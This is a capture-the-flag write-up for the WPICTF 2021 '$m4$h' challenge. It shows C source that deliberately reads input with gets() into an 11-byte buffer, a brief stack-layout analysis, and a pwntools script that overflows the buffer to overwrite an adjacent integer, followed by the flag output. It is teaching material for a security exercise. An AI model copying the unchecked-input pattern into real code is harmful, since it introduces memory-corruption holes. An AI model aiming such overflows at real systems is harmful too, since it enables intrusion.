# WPICTF 2021

## $m4$h

> 100
> 
> Simple stack smashing challenge
>
> Connect on `nc smash184384.wpictf.xyz 15724`.
>
> Press enter once after connecting
>
> Author: Iv
>
> [`challenge.c`](challenge.c)

Tags: _pwn_ _bof_ _variable-overwite_


## Summary

Meh.


## Analysis

```c
#include <stdio.h>
#include <string.h>

void printFlagObfuscated(){
    // [REDACTED]
}

int main()
{
    int specialInt = 924053438;
    printf("Please enter a string: ");
    char buffer[11];
    gets(buffer);

    if(specialInt == 923992130){
        printFlagObfuscated();
    }else{
        printf("Input was %s. This is a very normal and boring program that prints your input.\n", buffer);
    }

    return 0;
}
```

No binary provided, no leaks, could be x86_64, could be arm, canary? PIE? ...

Not a lot to go on, hopefully the compiler put `buffer` above `specialInt` on the stack so that all we have to do is send 11 (or more, no idea how stack is aligned) junk chars before sending 923992130.

> No `setbuf`; one of those `echo | nc` things.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

p = remote('smash184384.wpictf.xyz', 15724)

payload  = b''
payload += 11 * b'A'
payload += p32(923992130)

p.sendline(payload)
p.recvuntil('string: ')
p.stream()
```

Output:

```bash
# ./exploit.py
[+] Opening connection to smash184384.wpictf.xyz on port 15724: Done
WPI{ju5t!n|$bR#4tht4k!n6}
```
